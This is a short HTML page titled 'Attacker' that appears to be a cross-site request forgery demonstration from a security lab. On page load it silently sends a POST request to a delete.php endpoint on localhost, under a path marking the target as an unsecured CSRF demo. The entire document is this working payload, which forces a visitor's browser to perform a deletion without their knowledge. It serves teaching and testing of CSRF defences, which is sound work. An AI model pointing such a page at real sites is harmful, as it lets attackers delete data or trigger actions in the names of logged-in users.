<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>Attacker</title>
</head>

<body>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
    <script>
        $.ajax({
            'url': 'http://localhost/security/csrf/unsecured/delete.php',
            'type': 'post'
        });
    </script>
</body>

</html>